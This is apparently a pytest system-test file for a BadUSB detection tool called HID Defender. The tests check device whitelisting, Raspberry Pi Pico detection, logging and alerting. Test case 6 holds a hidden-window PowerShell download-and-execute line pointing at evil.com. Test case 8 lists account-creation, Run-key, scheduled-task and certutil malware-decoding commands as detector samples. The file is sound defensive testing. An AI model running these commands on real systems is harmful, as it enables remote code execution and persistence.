"""
CHAPTER 4: TESTING AND ANALYSIS
System Test Cases 1–20 — HID Defender

Integration / end-to-end tests that verify the complete workflow.
"""

import csv
import json
import os
import time
import threading
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

import sys
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

import hid_defender.config as config
import hid_defender.device_validator as device_validator
import hid_defender.device_monitor as device_monitor
import hid_defender.logging_setup as logging_setup
import hid_defender.alert_system as alert_system

# ── Shared fixtures ───────────────────────────────────────────────────────────

@pytest.fixture
def whitelist_file(tmp_path):
    data = [
        {"hardware_id": "VID_046D&PID_C077", "vendor": "Logitech", "name": "USB Mouse"},
        {"hardware_id": "VID_1B1C&PID_1BAC", "vendor": "Corsair",  "name": "Gaming Keyboard"},
    ]
    p = tmp_path / "trusted_devices.json"
    p.write_text(json.dumps(data))
    return p


@pytest.fixture
def log_file(tmp_path):
    return tmp_path / "hid_alerts.log"


@pytest.fixture(autouse=True)
def patch_paths(tmp_path, monkeypatch, whitelist_file, log_file):
    monkeypatch.setattr("hid_defender.config.WHITELIST_PATH",           str(whitelist_file))
    monkeypatch.setattr("hid_defender.device_validator.WHITELIST_PATH",  str(whitelist_file))
    monkeypatch.setattr("hid_defender.logging_setup.LOG_PATH",           str(log_file))


def make_device(name, vendor, vid, pid, suffix="\\1"):
    return {
        "name":    name,
        "vendor":  vendor,
        "product": name,
        "id":      f"USB\\{vid}&{pid}{suffix}",
    }


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 1 — Trusted Device Workflow
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase01_TrustedDeviceWorkflow:
    """TC-SYS-01: Trusted Device Workflow"""

    def test_trusted_device_workflow(self, log_file):
        """
        Objective : Verify trusted device workflow in integrated system.
        Action    : Load whitelist, detect device, evaluate, write to log.
        Expected  : Device marked TRUSTED, logged correctly, no alert raised.
        """
        whitelist = device_validator.get_whitelist()
        device    = make_device("USB Mouse", "Logitech", "VID_046D", "PID_C077")

        result, action, reason = device_validator.evaluate(device, whitelist)
        assert result == "TRUSTED"

        # Write log entry directly (CSV)
        log_file.parent.mkdir(parents=True, exist_ok=True)
        with log_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time","Device","Vendor","Product","ID","Result","Action","Reason"])
            writer.writerow(["2026-01-01 12:00:00", device["name"], device["vendor"],
                             device["product"], device["id"], result, action, reason])

        assert log_file.exists()
        assert "TRUSTED" in log_file.read_text()


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 2 — Unknown Device Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase02_UnknownDeviceDetection:
    """TC-SYS-02: Unknown Device Detection"""

    def test_unknown_device_detection(self, log_file):
        """
        Objective : Verify unknown device detection in integrated system.
        Action    : Detect an unknown device, evaluate, write to log.
        Expected  : Device marked UNTRUSTED, blocked, logged.
        """
        whitelist = device_validator.get_whitelist()
        device    = make_device("Unknown HID", "Generic", "VID_DEAD", "PID_BEEF")

        result, action, reason = device_validator.evaluate(device, whitelist)
        assert result == "UNTRUSTED"
        assert action == "BLOCKED"

        log_file.parent.mkdir(parents=True, exist_ok=True)
        with log_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time","Device","Vendor","Product","ID","Result","Action","Reason"])
            writer.writerow(["2026-01-01 12:00:00", device["name"], device["vendor"],
                             device["product"], device["id"], result, action, reason])
        assert "UNTRUSTED" in log_file.read_text()


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 3 — Full System Integration
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase03_FullSystemIntegration:
    """TC-SYS-03: Full System Integration"""

    def test_full_system_integration(self, log_file, monkeypatch):
        """
        Objective : Verify full system integration — startup through logging.
        Action    : Init logger, load whitelist, detect device, evaluate, log.
        Expected  : Complete pipeline completes without errors.
        """
        monkeypatch.setattr("hid_defender.logging_setup.LOG_PATH", str(log_file))

        logger    = logging_setup.init_logger("INFO")
        whitelist = device_validator.get_whitelist()
        device    = make_device("USB Mouse", "Logitech", "VID_046D", "PID_C077")

        result, action, reason = device_validator.evaluate(device, whitelist)
        logging_setup.log_event(logger, device, result, action, reason)

        assert logger    is not None
        assert whitelist is not None
        assert result    in ("TRUSTED", "SAFE", "UNTRUSTED")
        assert log_file.exists()


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 4 — Normal Usage Behavior
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase04_NormalUsageBehavior:
    """TC-SYS-04: Normal Usage Behavior"""

    def test_normal_usage_behavior(self):
        """
        Objective : Verify normal usage — trusted devices are allowed.
        Action    : Evaluate 3 known-good devices.
        Expected  : All are TRUSTED or SAFE (no false positives).
        """
        whitelist = device_validator.get_whitelist()
        trusted_devices = [
            make_device("USB Mouse",        "Logitech",   "VID_046D", "PID_C077"),
            make_device("Gaming Keyboard",   "Corsair",    "VID_1B1C", "PID_1BAC"),
        ]
        for dev in trusted_devices:
            result, _, _ = device_validator.evaluate(dev, whitelist)
            assert result in ("TRUSTED", "SAFE"), \
                f"False positive: {dev['name']} flagged as {result}"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 5 — Pico Attack Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase05_PicoAttackDetection:
    """TC-SYS-05: Pico Attack Detection"""

    def test_pico_attack_detection(self):
        """
        Objective : Verify Raspberry Pi Pico (BadUSB) attack is detected.
        Action    : Evaluate a device with VID_2E8A (Pi Pico).
        Expected  : Result == UNTRUSTED with attack-vector reason.
        """
        whitelist = device_validator.get_whitelist()
        pico_device = make_device("Raspberry Pi Pico", "Raspberry Pi",
                                  "VID_2E8A", "PID_0005")

        result, action, reason = device_validator.evaluate(pico_device, whitelist)

        assert result == "UNTRUSTED",    "Pi Pico should be UNTRUSTED"
        assert "attack" in reason.lower() or "vid" in reason.lower(), \
               f"Unexpected reason: {reason}"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 6 — Keystroke Injection Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase06_KeystrokeInjectionDetection:
    """TC-SYS-06: Keystroke Injection Detection"""

    def test_keystroke_injection_detection(self):
        """
        Objective : Verify keystroke injection is detected via MALICIOUS_PATTERNS.
        Action    : Match a BadUSB payload string against MALICIOUS_PATTERNS.
        Expected  : At least one pattern matches the payload.
        """
        bad_payload = "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/rev.ps1')"
        patterns    = config.MALICIOUS_PATTERNS

        matched = any(pat.lower() in bad_payload.lower() for pat in patterns)
        assert matched, "Keystroke injection payload not detected"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 7 — Delay Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase07_DelayDetection:
    """TC-SYS-07: Delay Detection"""

    def test_delay_detection(self):
        """
        Objective : Verify delay detection — sub-threshold delay is abnormal.
        Action    : Compare a simulated first-input delay against config threshold.
        Expected  : Delay < threshold is flagged as abnormal (BadUSB behaviour).
        """
        threshold   = config.FIRST_INPUT_DELAY_THRESHOLD   # default 1 s
        pico_delay  = 0.05  # Pi Pico fires in ~50 ms

        assert pico_delay < threshold, \
               "Pi Pico delay should be below the threshold"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 8 — Command Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase08_CommandDetection:
    """TC-SYS-08: Command Detection"""

    @pytest.mark.parametrize("cmd", [
        "net user attacker P@ssw0rd /add",
        "reg add HKCU\\Run /v Malware /d C:\\evil.exe",
        "schtasks /create /sc onlogon /tn evil",
        "certutil -decode encoded.b64 malware.exe",
    ])
    def test_command_detection(self, cmd):
        """
        Objective : Verify command detection covers real-world attack commands.
        Action    : Match known-bad command strings against MALICIOUS_PATTERNS.
        Expected  : Each command is matched by at least one pattern.
        """
        matched = any(pat.lower() in cmd.lower() for pat in config.MALICIOUS_PATTERNS)
        assert matched, f"Command not detected: {cmd}"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 9 — Alert and Log Integration
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase09_AlertAndLogIntegration:
    """TC-SYS-09: Alert and Log Integration"""

    def test_alert_and_log_integration(self, log_file):
        """
        Objective : Verify alert and log integration for untrusted device.
        Action    : Detect untrusted device, trigger alert, write log.
        Expected  : Log contains UNTRUSTED entry; alert does not crash.
        """
        whitelist = device_validator.get_whitelist()
        device    = make_device("BadUSB", "Unknown", "VID_DEAD", "PID_BEEF")
        result, action, reason = device_validator.evaluate(device, whitelist)

        with patch("hid_defender.alert_system.subprocess.Popen"), \
             patch("hid_defender.alert_system.threading.Thread"):
            alert_system.show_alert(device)

        log_file.parent.mkdir(parents=True, exist_ok=True)
        with log_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time","Device","Vendor","Product","ID","Result","Action","Reason"])
            writer.writerow(["2026-01-01", device["name"], device["vendor"],
                             device["product"], device["id"], result, action, reason])

        assert "UNTRUSTED" in log_file.read_text()


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 10 — Dashboard Synchronization
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase10_DashboardSynchronization:
    """TC-SYS-10: Dashboard Synchronization"""

    def test_dashboard_synchronization(self, log_file, monkeypatch):
        """
        Objective : Verify dashboard synchronization reads log correctly.
        Action    : Write two events to log CSV; read and parse via csv.DictReader.
        Expected  : Both events appear in the parsed output.
        """
        header = "Time,Device,Vendor,Product,ID,Result,Action,Reason\n"
        rows   = (
            "2026-01-01 10:00:00,USB Mouse,Logitech,Mouse,VID_046D&PID_C077,TRUSTED,ALLOWED,Whitelisted\n"
            "2026-01-01 10:01:00,BadUSB,Unknown,Unknown,VID_DEAD&PID_BEEF,UNTRUSTED,BLOCKED,Unknown HID\n"
        )
        log_file.write_text(header + rows, encoding="utf-8")

        events = []
        with log_file.open(newline="", encoding="utf-8") as f:
            for row in csv.DictReader(f):
                events.append(row)

        assert len(events) == 2
        assert events[0]["Result"] == "TRUSTED"
        assert events[1]["Result"] == "UNTRUSTED"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 11 — Multiple Devices Handling
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase11_MultipleDevicesHandling:
    """TC-SYS-11: Multiple Devices Handling"""

    def test_multiple_devices_handling(self, log_file):
        """
        Objective : Verify multiple devices handling in integrated system.
        Action    : Evaluate 4 devices and write results to CSV log.
        Expected  : Log contains both TRUSTED and UNTRUSTED entries.
        """
        whitelist = device_validator.get_whitelist()
        devices   = [
            make_device("USB Mouse", "Logitech", "VID_046D", "PID_C077", "\\1"),
            make_device("Keyboard",  "Corsair",  "VID_1B1C", "PID_1BAC", "\\2"),
            make_device("BadUSB",    "Unknown",  "VID_DEAD", "PID_BEEF", "\\3"),
            make_device("Pi Pico",   "RPI",      "VID_2E8A", "PID_0005", "\\4"),
        ]

        log_file.parent.mkdir(parents=True, exist_ok=True)
        with log_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time","Device","Vendor","Product","ID","Result","Action","Reason"])
            for dev in devices:
                result, action, reason = device_validator.evaluate(dev, whitelist)
                writer.writerow(["2026-01-01", dev["name"], dev["vendor"],
                                 dev["product"], dev["id"], result, action, reason])

        content = log_file.read_text()
        assert "TRUSTED"   in content
        assert "UNTRUSTED" in content


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 12 — Logging Failure Handling
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase12_LoggingFailureHandling:
    """TC-SYS-12: Logging Failure Handling"""

    def test_logging_failure_handling(self, tmp_path, monkeypatch):
        """
        Objective : Verify logging failure handling — read-only log path.
        Action    : Point log to a read-only directory, attempt to log.
        Expected  : System does not crash; error is handled gracefully.
        """
        ro_dir = tmp_path / "readonly"
        ro_dir.mkdir()
        bad_log = ro_dir / "hid_alerts.log"
        monkeypatch.setattr("hid_defender.logging_setup.LOG_PATH", str(bad_log))

        # Make dir read-only (Windows: remove write permission)
        import stat
        ro_dir.chmod(stat.S_IREAD | stat.S_IEXEC)

        logger = logging_setup.init_logger()
        device = make_device("Test", "Test", "VID_0000", "PID_0000")

        try:
            logging_setup.log_event(logger, device, "TRUSTED", "ALLOWED", "test")
        except PermissionError:
            pass  # acceptable — system should not crash beyond this
        except Exception as exc:
            pytest.fail(f"Unexpected exception during logging failure: {exc}")
        finally:
            ro_dir.chmod(stat.S_IWRITE | stat.S_IREAD | stat.S_IEXEC)


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 13 — System Stability
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase13_SystemStability:
    """TC-SYS-13: System Stability"""

    def test_system_stability(self):
        """
        Objective : Verify system stability under repeated evaluation calls.
        Action    : Evaluate 50 devices in a loop.
        Expected  : No exceptions; all return valid result tuples.
        """
        whitelist = device_validator.get_whitelist()
        for i in range(50):
            device = make_device(f"Device {i}", "Vendor", "VID_0001", f"PID_{i:04X}")
            result, action, reason = device_validator.evaluate(device, whitelist)
            assert result in ("TRUSTED", "SAFE", "UNTRUSTED")


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 14 — Continuous Monitoring
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase14_ContinuousMonitoring:
    """TC-SYS-14: Continuous Monitoring"""

    def test_continuous_monitoring(self):
        """
        Objective : Verify continuous monitoring via BackgroundDeviceMonitor.
        Action    : Start monitor, let it tick once, stop it.
        Expected  : Monitor starts and stops cleanly without hanging.
        """
        events_seen = []

        def callback(new_devices):
            events_seen.extend(new_devices)

        monitor = device_monitor.BackgroundDeviceMonitor(
            callback=callback,
            scan_interval=0.1,
            wmi_client=None,
        )
        monitor.start()
        time.sleep(0.3)
        monitor.stop()

        assert not monitor.is_running, "Monitor should have stopped"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 15 — Repeated Attack Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase15_RepeatedAttackDetection:
    """TC-SYS-15: Repeated Attack Detection"""

    def test_repeated_attack_detection(self):
        """
        Objective : Verify repeated attack detection on same attack device.
        Action    : Evaluate the same attack device 5 times.
        Expected  : Every evaluation returns UNTRUSTED (no state that lets it slip through).
        """
        whitelist = device_validator.get_whitelist()
        attack    = make_device("Pi Pico", "RPI", "VID_2E8A", "PID_0005")

        for _ in range(5):
            result, _, _ = device_validator.evaluate(attack, whitelist)
            assert result == "UNTRUSTED"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 16 — System Recovery
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase16_SystemRecovery:
    """TC-SYS-16: System Recovery"""

    def test_system_recovery(self, tmp_path, monkeypatch):
        """
        Objective : Verify system recovery after whitelist becomes corrupt.
        Action    : Corrupt whitelist mid-run, then reload.
        Expected  : System recovers and returns empty list (does not crash).
        """
        wl = tmp_path / "trusted_devices.json"
        wl.write_text(json.dumps([{"hardware_id": "VID_046D&PID_C077"}]))
        monkeypatch.setattr("hid_defender.device_validator.WHITELIST_PATH", str(wl))

        first = device_validator.get_whitelist()
        assert len(first) == 1

        # Corrupt the file
        wl.write_text("{broken json")

        recovered = device_validator.get_whitelist()
        assert isinstance(recovered, list)  # should not raise


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 17 — Real-time Response
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase17_RealTimeResponse:
    """TC-SYS-17: Real-time Response"""

    def test_real_time_response(self):
        """
        Objective : Verify real-time response — evaluation is fast (<100 ms).
        Action    : Time a single evaluate() call.
        Expected  : Completes in under 100 ms.
        """
        whitelist = device_validator.get_whitelist()
        device    = make_device("USB Mouse", "Logitech", "VID_046D", "PID_C077")

        start  = time.time()
        result, _, _ = device_validator.evaluate(device, whitelist)
        elapsed = time.time() - start

        assert elapsed < 0.1, f"Evaluation took too long: {elapsed:.3f}s"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 18 — Dashboard Accuracy
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase18_DashboardAccuracy:
    """TC-SYS-18: Dashboard Accuracy"""

    def test_dashboard_accuracy(self, log_file):
        """
        Objective : Verify dashboard accuracy — counts match logged events.
        Action    : Write 3 TRUSTED and 2 UNTRUSTED events to CSV log, count via reader.
        Expected  : Parsed counts equal logged counts exactly.
        """
        log_file.parent.mkdir(parents=True, exist_ok=True)
        with log_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time","Device","Vendor","Product","ID","Result","Action","Reason"])
            for _ in range(3):
                writer.writerow(["2026-01-01","Mouse","Logitech","Mouse",
                                 "VID_046D&PID_C077","TRUSTED","ALLOWED","Whitelisted"])
            for _ in range(2):
                writer.writerow(["2026-01-01","BadUSB","Unknown","Unknown",
                                 "VID_DEAD&PID_BEEF","UNTRUSTED","BLOCKED","Unknown HID"])

        trusted_count = untrusted_count = 0
        with log_file.open(newline="", encoding="utf-8") as f:
            for row in csv.DictReader(f):
                if row.get("Result") == "TRUSTED":   trusted_count   += 1
                elif row.get("Result") == "UNTRUSTED": untrusted_count += 1

        assert trusted_count   == 3, f"Expected 3 TRUSTED, got {trusted_count}"
        assert untrusted_count == 2, f"Expected 2 UNTRUSTED, got {untrusted_count}"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 19 — Post-detection Stability
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase19_PostDetectionStability:
    """TC-SYS-19: Post-detection Stability"""

    def test_post_detection_stability(self, log_file, monkeypatch):
        """
        Objective : Verify post-detection stability — system keeps working after alert.
        Action    : Trigger alert on attack device, then evaluate a safe device.
        Expected  : Safe device still evaluated correctly after attack event.
        """
        monkeypatch.setattr("hid_defender.logging_setup.LOG_PATH", str(log_file))

        whitelist = device_validator.get_whitelist()

        attack = make_device("Pi Pico", "RPI", "VID_2E8A", "PID_0005")
        r1, _, _ = device_validator.evaluate(attack, whitelist)
        assert r1 == "UNTRUSTED"

        # System should still evaluate trusted devices correctly afterwards
        safe = make_device("Mouse", "Logitech", "VID_046D", "PID_C077")
        r2, _, _ = device_validator.evaluate(safe, whitelist)
        assert r2 == "TRUSTED"


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TEST CASE 20 — Security Objective Validation
# ══════════════════════════════════════════════════════════════════════════════
class TestSystemCase20_SecurityObjectiveValidation:
    """TC-SYS-20: Security Objective Validation"""

    def test_security_objective_validation(self):
        """
        Objective : Verify security objective validation — all known attack VIDs blocked.
        Action    : Evaluate one device per ATTACK_VECTORS VID.
        Expected  : Every attack VID results in UNTRUSTED.
        """
        whitelist = device_validator.get_whitelist()

        for vid in config.ATTACK_VECTORS:
            device = make_device(f"Attack ({vid})", "Unknown", vid, "PID_0001")
            result, action, _ = device_validator.evaluate(device, whitelist)
            assert result == "UNTRUSTED", f"{vid} should be UNTRUSTED, got {result}"
            assert action == "BLOCKED",   f"{vid} should be BLOCKED, got {action}"
